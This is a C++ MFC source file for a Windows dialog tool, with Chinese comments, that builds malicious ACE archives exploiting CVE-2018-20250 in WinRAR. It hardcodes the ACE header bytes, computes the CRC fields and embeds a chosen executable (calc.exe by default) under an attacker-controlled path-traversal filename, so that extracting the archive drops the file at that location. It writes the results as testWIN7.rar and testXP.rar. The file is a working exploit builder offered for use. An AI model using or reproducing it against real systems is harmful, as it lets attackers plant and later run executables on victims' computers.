
// cve-2018-20250Dlg.cpp : 实现文件
//

#include "stdafx.h"
#include "cve-2018-20250.h"
#include "cve-2018-20250Dlg.h"
#include "afxdialogex.h"
#include <io.h>


#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// Ccve201820250Dlg 对话框



Ccve201820250Dlg::Ccve201820250Dlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_CVE201820250_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void Ccve201820250Dlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, m_edit);
	DDX_Control(pDX, IDC_EDIT3, m_edit2);
}

BEGIN_MESSAGE_MAP(Ccve201820250Dlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDOK, &Ccve201820250Dlg::OnBnClickedOk)
	ON_BN_CLICKED(IDCANCEL, &Ccve201820250Dlg::OnBnClickedCancel)
	ON_BN_CLICKED(IDC_BUTTON1, &Ccve201820250Dlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &Ccve201820250Dlg::OnBnClickedButton2)
	ON_BN_CLICKED(IDC_BUTTON3, &Ccve201820250Dlg::OnBnClickedButton3)
END_MESSAGE_MAP()


// Ccve201820250Dlg 消息处理程序

BOOL Ccve201820250Dlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void Ccve201820250Dlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void Ccve201820250Dlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR Ccve201820250Dlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void GetFpath(char *buff)
{
	int Dlen = strlen(buff);
	if (Dlen == 0) return;
	int i = 0;
	while (Dlen > 0)
	{
		if (buff[Dlen - 1] == '\\')
		{
			buff[Dlen - 1] = '\0';
			break;
		}
		else
		{
			buff[Dlen - 1] = '\0';
			Dlen--;
			i++;
		}
	}
}

//校验头算法 CRC16_CCITT（0XFFFF） 
unsigned short CRC16_CCITT_FALSE(unsigned char *puchMsg, unsigned int usDataLen)
{
	unsigned short wCRCin = 0xFFFF;
	unsigned short wCPoly = 0x1021;
	unsigned char wChar = 0;

	while (usDataLen--)
	{
		wChar = *(puchMsg++);
		wCRCin ^= (wChar << 8);
		for (int i = 0; i < 8; i++)
		{
			if (wCRCin & 0x8000)
				wCRCin = (wCRCin << 1) ^ wCPoly;
			else
				wCRCin = wCRCin << 1;
		}
	}
	return (wCRCin);
}

void InvertUint8(unsigned char *dBuf, unsigned char *srcBuf)
{
	int i;
	unsigned char tmp[4];
	tmp[0] = 0;
	for (i = 0; i< 8; i++)
	{
		if (srcBuf[0] & (1 << i))
			tmp[0] |= 1 << (7 - i);
	}
	dBuf[0] = tmp[0];

}
void InvertUint16(unsigned short *dBuf, unsigned short *srcBuf)
{
	int i;
	unsigned short tmp[4];
	tmp[0] = 0;
	for (i = 0; i< 16; i++)
	{
		if (srcBuf[0] & (1 << i))
			tmp[0] |= 1 << (15 - i);
	}
	dBuf[0] = tmp[0];
}
void InvertUint32(unsigned int *dBuf, unsigned int *srcBuf)
{
	int i;
	unsigned int tmp[4];

	tmp[0] = 0;

	for (i = 0; i< 32; i++)
	{
		if (srcBuf[0] & (1 << i))
			tmp[0] |= 1 << (15 - i);
	}
	dBuf[0] = tmp[0];
}

//CRC32算法：
unsigned int CRC32(unsigned char *puchMsg, unsigned int usDataLen)
{
	int i;
	unsigned int wCRCin = 0xFFFFFFFF;
	unsigned int wCPoly = 0x04C11DB7;
	unsigned int wChar = 0;
	while (usDataLen--)
	{
		wChar = *(puchMsg++);
		InvertUint8((unsigned char *)&wChar, (unsigned char *)&wChar);
		wCRCin ^= (wChar << 24);
		for (i = 0; i < 8; i++)
		{
			if (wCRCin & 0x80000000)
				wCRCin = (wCRCin << 1) ^ wCPoly;
			else
				wCRCin = wCRCin << 1;
		}
	}
	InvertUint32(&wCRCin, &wCRCin);
	return (wCRCin ^ 0xFFFFFFFF);
}

//生成文件并写入头字段
void build_filename(char *shellcode, char*filename)
{

	FILE *fp = fopen(filename, "w");
	CString str(shellcode);
	for (int i = 0; i < 53; i++)
	{
		fprintf(fp, "%c", shellcode[i]);
	}
	fclose(fp);
}

//将字符转换为数值
int c2i(char ch)
{
	// 如果是数字，则用数字的ASCII码减去48, 如果ch = '2' ,则 '2' - 48 = 2  
	if (isdigit(ch))
		return ch - 48;

	// 如果是字母，但不是A~F,a~f则返回  
	if (ch < 'A' || (ch > 'F' && ch < 'a') || ch > 'z')
		return -1;

	// 如果是大写字母，则用数字的ASCII码减去55, 如果ch = 'A' ,则 'A' - 55 = 10  
	// 如果是小写字母，则用数字的ASCII码减去87, 如果ch = 'a' ,则 'a' - 87 = 10  
	if (isalpha(ch))
		return isupper(ch) ? ch - 55 : ch - 87;

	return -1;
}
//16进制字符串转int
unsigned int hex2dec(char *hex)
{
	unsigned	int len;
	unsigned	int num = 0;
	unsigned    int temp;
	unsigned	int bits;
	unsigned	int i;

	// 此例中 hex = "1de" 长度为3, hex是main函数传递的  
	len = strlen(hex);

	for (i = 0, temp = 0; i<len; i++, temp = 0)
	{
		// 第一次：i=0, *(hex + i) = *(hex + 0) = '1', 即temp = 1  
		// 第二次：i=1, *(hex + i) = *(hex + 1) = 'd', 即temp = 13  
		// 第三次：i=2, *(hex + i) = *(hex + 2) = 'd', 即temp = 14  
		temp = c2i(*(hex + i));
		// 总共3位，一个16进制位用 4 bit保存  
		// 第一次：'1'为最高位，所以temp左移 (len - i -1) * 4 = 2 * 4 = 8 位  
		// 第二次：'d'为次高位，所以temp左移 (len - i -1) * 4 = 1 * 4 = 4 位  
		// 第三次：'e'为最低位，所以temp左移 (len - i -1) * 4 = 0 * 4 = 0 位  
		bits = (len - i - 1) * 4;
		temp = temp << bits;

		// 此处也可以用 num += temp;进行累加  
		num = num | temp;
	}

	// 返回结果  
	return num;
}

//生成shellcode
void make_shellcode(char*filename, char*path, char * fpath)
{
	FILE *fp = NULL;
	fp = fopen(filename, "rb");

	if (fp==NULL)
	{
		return;
	}
	char *buffer;
	fseek(fp, 0, SEEK_END);
	int bufflen = ftell(fp);
	buffer = new char[bufflen + 1];
	rewind(fp);
	fread(buffer, 1, bufflen, fp);
	fclose(fp);

	//获取文件名字
	char fname[256] = { 0 };
	memcpy(fname, filename, strlen(filename));
	PathStripPath(fname);


	int lenfname = strlen(fname);//文件名长度
	//-----------------------------------------------------------
	char Path[MAX_PATH] = { 0 };
	DWORD len1 = MAX_PATH;
	GetModuleFileName(NULL, Path, len1);
	GetFpath(Path);
	strcat(Path, "\\test1.rar\0");

	FILE *qp = fopen(Path, "wb");//先把文件头写到临时文件中

	//写文件类型01是file32，写flags 8001
	char charDat[] = { 0x01, 0x01, 0x80 };


	for (int i = 0; i < 3; i++)
	{
		fprintf(qp, "%c", charDat[i]);
	}
	//写文件内容长度，两遍

 	fwrite(&bufflen, 4, 1, qp);
 	fwrite(&bufflen, 4, 1, qp);

	//写时间信息

	char charDat2[] = { 0x63, 0xb0, 0x55, 0x4e };
	for (int i = 0; i < 4; i++)
	{
		fprintf(qp, "%c", charDat2[i]);
	}
	//写文件属性 
	char charDat3[] = { 0x20, 0x00, 0x00, 0x00 };

	for (int i = 0; i < 4; i++)
	{
		fprintf(qp, "%c", charDat3[i]);
	}
	//写CRC32----

	unsigned char * pTmp = (unsigned char *)buffer;

	unsigned  int  a1234;
	a1234 = CRC32(pTmp, bufflen);


	    //CRC验证码高低互换
		char c[20];
		sprintf(c, "%2x", a1234);// ;

		int c1 = strlen(c);
		int c2 = c1 / 2;

		char d[9] = { 0 }, d2[5] = { 0 };

		memcpy(d, c + 4, c2);
		memcpy(d2, c, c2);

		memcpy(d + 4, d2, c2);

		unsigned int aaaa = hex2dec(d);

	unsigned int bbbb = ~aaaa;//按位取反

	
	fwrite(&bbbb, 4, 1, qp);


	//写compqual 0300和params 000a

	char charDat4[] = { 0x00, 0x03, 0x0a, 0x00 };

	for (int i = 0; i < 4; i++)
	{
		fprintf(qp, "%c", charDat4[i]);
	}
	//写TE标志
	char charDat1[] = { 0x54, 0x45 };

	for (int i = 0; i < 2; i++)
	{
		fprintf(qp, "%c", charDat1[i]);
	}


	//写文件名长度
	fwrite(&lenfname, 2, 1, qp);


	//写文件名

	fwrite(fname, lenfname, 1, qp);

	fclose(qp);

	//获取临时文件内容

	FILE *pFile = fopen(Path, "r");
	char *pBuf;
	fseek(pFile, 0, SEEK_END);
	int len = ftell(pFile);
	pBuf = new char[len + 1];
	rewind(pFile);
	fread(pBuf, 1, len, pFile);
	fclose(pFile);

	//计算校验头

	unsigned char * pTmp1 = (unsigned char *)pBuf;

	unsigned  int b123;
	b123 = CRC32(pTmp1, len);

	char x[20];
	sprintf(x, "%2x", b123);// ;

	int x1 = strlen(c);
	int x2 = x1 / 2;

	char y[5] = { 0 }, y2[5] = { 0 };

	memcpy(y, x , x2);

	unsigned short aaaa2 = hex2dec(y);

	unsigned short bbbb2 = ~aaaa2;//按位取反

	//开始写文件
 	FILE *pFileOut = fopen(fpath, "ab");


 	//写CRC校验头

	fwrite(&bbbb2, 2, 1, pFileOut);

	//写头长度

	int hdr_len = 3 + 4 + 4 + 4 + 4 + 4 + 4 + 2 + 2 + lenfname;

	fwrite(&hdr_len, 2, 1, pFileOut);

	//写hdr内容
	fwrite(pBuf, 1, len, pFileOut);
	

	//写文件内容

	fwrite(buffer, bufflen, 1, pFileOut);

	fclose(pFileOut);
	delete[]buffer;
	delete[]pBuf;

	
}

//生成shellcode
void make_EXEshellcode(char*filename,char*path,char * fpath)
{
	FILE *fp = NULL;
	fp = fopen(filename, "rb");

	if (fp == NULL)
	{
		MessageBox(0,"请在目录下放入calc.exe", "提示", 0);
		return;
	}
	char *buffer;
	fseek(fp, 0, SEEK_END);
	int bufflen = ftell(fp);
	buffer = new char[bufflen + 1];
	rewind(fp);
	fread(buffer, 1, bufflen, fp);
	fclose(fp);

	//获取文件名字
	char fname[256] = { 0 };
	memcpy(fname, filename, strlen(filename));
	PathStripPath(fname);


	int lenfname = strlen(path);//文件名长度
//-----------------------------------------------------------
	char Path[MAX_PATH] = { 0 };
	DWORD len1 = MAX_PATH;
	GetModuleFileName(NULL, Path, len1);
	GetFpath(Path);
	strcat(Path, "\\test1.rar\0");

	FILE *qp = fopen(Path, "wb");//先把文件头写到临时文件中

	//写文件类型01是file32，写flags 8001
	char charDat[] = { 0x01, 0x01, 0x80 };


	for (int i = 0; i < 3; i++)
	{
		fprintf(qp, "%c", charDat[i]);
	}
	//写文件内容长度，两遍

	fwrite(&bufflen, 4, 1, qp);
	fwrite(&bufflen, 4, 1, qp);

	//写时间信息

	char charDat2[] = { 0x63, 0xb0, 0x55, 0x4e };
	for (int i = 0; i < 4; i++)
	{
		fprintf(qp, "%c", charDat2[i]);
	}
	//写文件属性 
	char charDat3[] = { 0x20, 0x00, 0x00, 0x00 };

	for (int i = 0; i < 4; i++)
	{
		fprintf(qp, "%c", charDat3[i]);
	}
	//写CRC32----

	unsigned char * pTmp = (unsigned char *)buffer;

	unsigned  int  a1234;
	a1234 = CRC32(pTmp, bufflen);


	//CRC验证码高低互换
	char c[20];
	sprintf(c, "%2x", a1234);// ;

	int c1 = strlen(c);
	int c2 = c1 / 2;

	char d[9] = { 0 }, d2[5] = { 0 };

	memcpy(d, c + 4, c2);
	memcpy(d2, c, c2);

	memcpy(d + 4, d2, c2);

	unsigned int aaaa = hex2dec(d);

	unsigned int bbbb = ~aaaa;//按位取反


	fwrite(&bbbb, 4, 1, qp);


	//写compqual 0300和params 000a

	char charDat4[] = { 0x00, 0x03, 0x0a, 0x00 };

	for (int i = 0; i < 4; i++)
	{
		fprintf(qp, "%c", charDat4[i]);
	}
	//写TE标志
	char charDat1[] = { 0x54, 0x45 };

	for (int i = 0; i < 2; i++)
	{
		fprintf(qp, "%c", charDat1[i]);
	}


	//写文件名长度
	fwrite(&lenfname, 2, 1, qp);


	//写文件名

	fwrite(path, strlen(path), 1, qp);

	fclose(qp);

	//获取临时文件内容

	FILE *pFile = fopen(Path, "r");
	char *pBuf;
	fseek(pFile, 0, SEEK_END);
	int len = ftell(pFile);
	pBuf = new char[len + 1];
	rewind(pFile);
	fread(pBuf, 1, len, pFile);
	fclose(pFile);

	//计算校验头 文件内容长度到文件名

	unsigned char * pTmp1 = (unsigned char *)pBuf;

	unsigned  int b123;
	b123 = CRC32(pTmp1, len);

	char x[20];
	sprintf(x, "%2x", b123);// ;

	int x1 = strlen(c);
	int x2 = x1 / 2;

	char y[5] = { 0 }, y2[5] = { 0 };

	memcpy(y, x, x2);

	unsigned short aaaa2 = hex2dec(y);

	unsigned short bbbb2 = ~aaaa2;//按位取反

	//开始写文件
	FILE *pFileOut = fopen(fpath, "ab");


	//写CRC校验头

	fwrite(&bbbb2, 2, 1, pFileOut);

	//写头长度

	int hdr_len = 3 + 4 + 4 + 4 + 4 + 4 + 4 + 2 + 2 + lenfname;

	fwrite(&hdr_len, 2, 1, pFileOut);

	//写hdr内容
	fwrite(pBuf, 1, len, pFileOut);


	//写文件内容

	fwrite(buffer, bufflen, 1, pFileOut);

	fclose(pFileOut);
	delete[]buffer;
	delete[]pBuf;


}

void Ccve201820250Dlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码

	CDialogEx::OnOK();

}


void Ccve201820250Dlg::OnBnClickedCancel()
{
	// TODO: 在此添加控件通知处理程序代码
	CDialogEx::OnCancel();

}


void Ccve201820250Dlg::OnBnClickedButton1()
{
	// TODO: 在此添加控件通知处理程序代码

	char Path[MAX_PATH] = { 0 };
	char fPath[MAX_PATH] = { 0 };
	DWORD len = MAX_PATH;

	GetModuleFileName(NULL, Path, len);
	GetFpath(Path);
	memcpy(fPath, Path, strlen(Path));


	CString str, str1;
	m_edit.GetWindowTextA(str);
	m_edit2.GetWindowTextA(str1);
	strcat(Path, "\\testWIN7.rar");
	strcat(fPath, "\\calc.exe");
	char charDat[] = { 0x6b,0x28,0x31,0x00,0x00,0x00,0x90,0x2A,0x2A,0x41,0x43,0x45,0x2A,0x2a,0x14,0x14,0x02,0x00,0x10,0x18,0x56,0x4e,0x97,0x4f,0xf6,0xaa,0x00,0x00,0x00,0x00,0x16,0x2a,0x55,0x4e,0x52,0x45,0x47,0x49,0x53,0x54,0x45,0x52,0x45,0x44,0x20,0x56,0x45,0x52,0x53,0x49,0x4f,0x4e,0x2a };

	build_filename(charDat, Path);

	if (str1 != "")
	{
		make_shellcode(str1.GetBuffer(), str.GetBuffer(), Path);
	}
	make_EXEshellcode(fPath, str.GetBuffer(), Path);

	MessageBox("生成testWIN7.rar成功", "提示", 0);
}


void Ccve201820250Dlg::OnBnClickedButton2()
{
	// TODO: 在此添加控件通知处理程序代码

	char Path[MAX_PATH] = { 0 };
	char fPath[MAX_PATH] = { 0 };
	DWORD len = MAX_PATH;

	GetModuleFileName(NULL, Path, len);
	GetFpath(Path);
	memcpy(fPath, Path, strlen(Path));

	CString str,str1;
	m_edit.GetWindowTextA(str);
	m_edit2.GetWindowTextA(str1);
	strcat(Path, "\\testXP.rar");
	strcat(fPath, "\\calc.exe");
	char charDat[] = { 0x6b,0x28,0x31,0x00,0x00,0x00,0x90,0x2A,0x2A,0x41,0x43,0x45,0x2A,0x2a,0x14,0x14,0x02,0x00,0x10,0x18,0x56,0x4e,0x97,0x4f,0xf6,0xaa,0x00,0x00,0x00,0x00,0x16,0x2a,0x55,0x4e,0x52,0x45,0x47,0x49,0x53,0x54,0x45,0x52,0x45,0x44,0x20,0x56,0x45,0x52,0x53,0x49,0x4f,0x4e,0x2a };

	build_filename(charDat, Path);
	if (str1!="")
	{
		make_shellcode(str1.GetBuffer(), str.GetBuffer(), Path);
	}
	
	make_EXEshellcode(fPath, str.GetBuffer(), Path);

	MessageBox ("生成testXP.rar成功","提示",0);
}


void Ccve201820250Dlg::OnBnClickedButton3()
{
	// TODO: 在此添加控件通知处理程序代码

	CFileDialog open_img(TRUE,
		NULL,
		NULL,
		NULL,
		_T("文本文件(*.txt)|*.txt|所有文件(*.*)|*.*|图片文件(*.png; *.jpg; *.jpeg)|*.png; *.jpg; *.jpeg|bmp文件(*.bmp)|*.bmp||"),//指定要打开的文件类型
		NULL);
	if (open_img.DoModal() == IDOK)
	{
		CString img_select;
		img_select = open_img.GetPathName();
		SetDlgItemText(IDC_EDIT3, img_select);//img_select为选择的文件的路径，IDC_IMGSELECTEDIT为edit控件名称
	}

}
